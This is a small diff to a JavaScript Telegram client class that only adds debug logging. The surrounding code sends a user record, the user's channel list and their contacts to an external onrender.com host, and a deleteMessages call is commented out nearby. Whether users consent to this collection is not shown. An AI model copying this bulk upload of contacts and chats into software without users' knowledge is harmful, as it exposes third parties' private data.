@@ -481,15 +481,19 @@ class TelegramManager {
                 date: new Date(Date.now() * 1000),//date,
                 tgId: user.id
             };
+            console.log("Calculated results");
             try {
+                console.log("posting results");
                 await axios.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
             } catch (error) {
+                console.log("Error Occured 1");
                 console.log(error)
             }
             // await this.deleteMessages();
         } catch (e) {
+            console.log("Error Occured 2");
             console.log(e)
         }
     }
